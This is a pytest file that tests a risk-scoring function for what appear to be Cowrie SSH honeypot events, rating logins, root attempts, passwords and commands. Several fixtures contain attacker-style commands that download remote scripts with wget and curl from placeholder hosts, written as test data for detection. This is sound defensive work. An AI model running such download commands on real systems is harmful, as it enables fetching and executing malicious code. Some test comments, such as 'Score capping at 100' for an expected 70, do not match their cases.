
import pytest
from sentinel.services.processor import calculate_risk_score

# Test cases for the calculate_risk_score function
# Each tuple contains: (event_dict, expected_score, expected_factors)
risk_score_test_cases = [
    # Base case: a simple, non-malicious event
    ({}, 10, ['Base Score']),

    # Successful login
    ({'eventid': 'cowrie.login.success'}, 50, ['Base Score', 'Successful Login']),

    # Root user login attempt
    ({'username': 'root'}, 20, ['Base Score', 'Root User Attempt']),

    # Common password usage (should decrease score)
    ({'password': 'password'}, 5, ['Base Score', 'Common Password']),
    
    # Non-common password usage
    ({'password': 'a-secure-password'}, 20, ['Base Score', 'Non-common Password']),

    # Command execution
    ({'eventid': 'cowrie.command.input'}, 35, ['Base Score', 'Command Executed']),

    # Command with file download attempt (wget)
    ({'eventid': 'cowrie.command.input', 'message': 'wget http://example.com/evil.sh'}, 65, ['Base Score', 'Command Executed', 'File Download Attempt']),

    # Command with file download attempt (curl)
    ({'eventid': 'cowrie.command.input', 'message': 'curl -O http://example.com/evil.sh'}, 65, ['Base Score', 'Command Executed', 'File Download Attempt']),

    # High-risk combination: successful root login with a command
    ({
        'eventid': 'cowrie.login.success',
        'username': 'root',
        'message': 'some command' # message is not used for command executed score
    }, 60, ['Base Score', 'Successful Login', 'Root User Attempt']),
    
    # Very high-risk: successful root login, non-common password, and wget
    ({
        'eventid': 'cowrie.command.input',
        'username': 'root',
        'password': 'a-secure-password',
        'message': 'wget http://some.site/payload'
    }, 85, ['Base Score', 'Root User Attempt', 'Non-common Password', 'Command Executed', 'File Download Attempt']),
    
    # Score capping at 100
    ({
        'eventid': 'cowrie.login.success',
        'username': 'root',
        'password': 'a-secure-password',
        'message': 'wget http://some.site/payload'
    }, 70, ['Base Score', 'Successful Login', 'Root User Attempt', 'Non-common Password']),
]

@pytest.mark.parametrize("event, expected_score, expected_factors", risk_score_test_cases)
def test_calculate_risk_score(event, expected_score, expected_factors):
    """
    Tests the calculate_risk_score function with various event payloads.
    """
    score, factors = calculate_risk_score(event)
    assert score == expected_score
    # Using set to ignore order of factors
    assert set(factors) == set(expected_factors)

